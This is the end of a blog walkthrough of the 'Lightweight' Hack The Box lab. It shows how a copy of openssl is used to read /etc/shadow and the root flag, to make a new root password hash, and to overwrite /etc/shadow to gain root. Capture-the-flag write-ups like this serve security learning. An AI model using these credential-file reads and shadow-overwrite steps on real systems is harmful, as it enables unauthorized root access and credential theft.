./root.txt.b64</code><br><code>base64 -d root.txt.b64</code><br><img src="/images/hackthebox/lightweight/27.png" alt=""><br>We can also get a root shell by overwriting <code>/etc/passwd</code> or <code>/etc/shadow</code>. I got a copy of the original <code>shadow</code> file first :<br><code>./openssl enc -base64 -in /etc/shadow -out ./shadow.b64</code><br><code>base64 -d shadow.b64 &gt; shadow</code><br><img src="/images/hackthebox/lightweight/28.png" alt=""><br>I used <code>openssl</code> to create a salted password. I used <code>root</code> as the salt and <code>rick</code> as the password :<br><code>openssl passwd -1 -salt root rick</code><br><img src="/images/hackthebox/lightweight/29.png" alt=""><br>Then I edited the copy I have of <code>/etc/shadow</code> and replaced the root password with the new one :<br><img src="/images/hackthebox/lightweight/30.png" alt=""><br>And finally I used <code>openssl</code> to replace the old <code>/etc/shadow</code> with the new one and after that we can do <code>su root</code> with the password <code>rick</code>:<br><code>./openssl enc -in shadow -out /etc/shadow</code><br><img src="/images/hackthebox/lightweight/31.png" alt=""><br>And we owned root !</p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/bighead/">Hack The Box - BigHead</a><br>Next Hack The Box write-up : <a href="/hack-the-box/conceal/">Hack The Box - Conceal</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-05-11</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/binary-exploitation/" rel="tag">#binary-exploitation</a> <a class="tag-link" href="/tags/forensics/" rel="tag">#forensics</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
